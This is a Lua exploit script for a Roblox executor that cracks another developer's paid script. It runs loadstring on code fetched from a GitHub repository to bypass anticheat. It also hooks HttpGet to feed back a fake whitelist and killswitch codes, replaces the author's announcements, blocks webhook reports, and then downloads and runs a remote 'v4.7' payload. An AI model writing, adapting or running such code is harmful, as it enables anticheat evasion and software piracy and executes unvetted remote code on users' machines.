print('zxro - ac bypass in progress')

loadstring(game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo2/main/utils"))() -- anticheat bypass to prevent anticheat bans

print('zxro - ac bypass complete, moving onto hook')

local old
old = hookfunction(game.HttpGet, function(self, url)
	if type(url) == "string" then -- to prevent errors by passing a non string through httpget
		if string.match(url, "ifFZVIKsziuM9un7dxEroDbzYOkHzWVt") or string.match(url, "eu3YJwdqJU9TsuSV34OlTbxWHiCTjVxO") then -- checks if the url contains the whitelist url
	        	return game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo2/main/wl") -- returns a fabricated table of whitelisted users, bypassing the premium system
		end
		if string.match(url, "hWqJG9NJ37TPEQR6OP5LXODHnkR6lPei") then -- checks if the url is the encrypt url
			return "hYz6LTxgBP" -- always return the correct encrypt code, bypassing any attempt at killswitching the script
		end
		if string.match(url, "7HT52lTFukTauFXYJWyd7dhZGd7CoDEl") then -- prevents xk5ng from making any changes to the notify system
			return game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo/main/Notify") -- return my clone of the notify system
		end
		if string.match(url, "alert") and string.match(url, "XK5NG") then -- prevents xk5ng from making any changes to alert
			return game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo2/main/alert") -- my clone of alert, will be updated soon
		end
		if string.match(url, "Annc") and string.match(url, "XK5NG") then -- checks if the url is trying to grab announcements
			return game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo2/main/annc") -- replace announcements with my zxro™ announcements
		end
		if string.match(url, "uG7YfIn5Rlw2i5X5zNROZde5bIngmXNb") then -- some other attempt at a killswitch i assume
			return "oJHAtRRmnsztfcMBXVkoJEX8TrsRh1wg" -- return the correct code again
		end
		if string.match(url, "sDUwcTOqcPpqMBfLGwroe8vyq5Dpsb3D") then -- idfk what this is, i'd assume some honeypot that triggers a ban or a blacklist system
			return "return {}" -- return nothing
		end
		if string.match(url, "raw%.githubusercontent%.com/zxrorocks/test%-repo/main/test") then -- for my own test of the hookfunction system 
			return "nah"
		end
		if not string.match(url, "zxrorocks") then -- if anything else comes up i'll catch it with this
			print(url)
			return old(self, url)
		end
	end
    return old(self, url)
end)


local old = http_request
http_request = function(x)
	return "No." -- prevents webhook requests
end

local old = http.request
http.request = function(x)
	return "No." -- prevents webhook requests
end
      
print('zxro - hooking complete, moving onto test')

if game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo/main/test") ~= "nah" then -- makes a request to the hookfunction test
	game.Players.LocalPlayer:Kick("Your executor does not support hookfunction (💀)") -- if the response is anything other than what i hooked, then executor doesn't support it and kick player
	return -- halts anything further
end

print('zxro - test complete, have fun')

loadstring(game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo2/main/v4.7"))()
